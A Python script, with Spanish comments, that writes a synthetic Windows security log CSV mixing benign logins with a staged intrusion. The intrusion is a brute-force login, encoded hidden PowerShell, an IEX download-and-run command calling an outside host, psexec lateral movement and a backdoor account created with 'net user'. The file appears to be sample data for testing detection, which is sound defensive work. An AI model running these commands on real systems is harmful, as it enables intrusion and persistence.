"""Genera un CSV SINTÉTICO (no es el Excel del cliente): escenario de ataque + ruido benigno."""
import csv, datetime as dt
from pathlib import Path
t0, rows = dt.datetime(2026, 3, 10, 8, 0), []
def add(m, host, eid, user, ip, src, desc, cmd="", res="Success", sev="Info"):
    rows.append([f"L{len(rows)+1:04d}", (t0 + dt.timedelta(minutes=m)).strftime("%Y-%m-%d %H:%M:%S"), host, eid, user, ip, "", src, desc, cmd, res, sev])
for i in range(12): add(i * 20, f"WS-{i%4+1:02d}", "4624", f"user{i%4+1}", f"10.0.1.{10+i%4}", "Windows Security", "Inicio de sesión")
for i in range(9): add(240 + i, "SRV-WEB01", "4625", "admin", "185.220.101.45", "Windows Security", "Inicio de sesión fallido", res="Failure", sev="Medium")
add(250, "SRV-WEB01", "4624", "admin", "185.220.101.45", "Windows Security", "Inicio de sesión exitoso", sev="High")
add(253, "SRV-WEB01", "4104", "admin", "185.220.101.45", "PowerShell", "Script block", "powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA", sev="Critical")
add(256, "SRV-WEB01", "4688", "admin", "185.220.101.45", "Sysmon", "Proceso creado", "powershell IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.7/a.ps1')", sev="Critical")
for i, h in enumerate(["SRV-APP01", "SRV-DB01", "SRV-FILE01"]): add(262 + 3 * i, h, "4624", "admin", "10.0.2.15", "Windows Security", "Inicio de sesión de red", sev="High")
add(272, "SRV-DB01", "4688", "admin", "10.0.2.15", "Sysmon", "Proceso creado", r"psexec \\SRV-DB01 -s cmd.exe", sev="High")
add(275, "SRV-DB01", "4720", "admin", "10.0.2.15", "Windows Security", "Cuenta creada", "net user svc_backup P@ss /add", sev="Critical")
out = Path(__file__).resolve().parent.parent / "samples" / "sample_logs.csv"
with open(out, "w", newline="", encoding="utf-8") as f:
    w = csv.writer(f); w.writerow(["Log_ID","Timestamp","Hostname","Event_ID","User","Source_IP","Destination","Log_Source","Event_Description","Process_CommandLine","Result","Severity"]); w.writerows(rows)
print(len(rows), "filas")
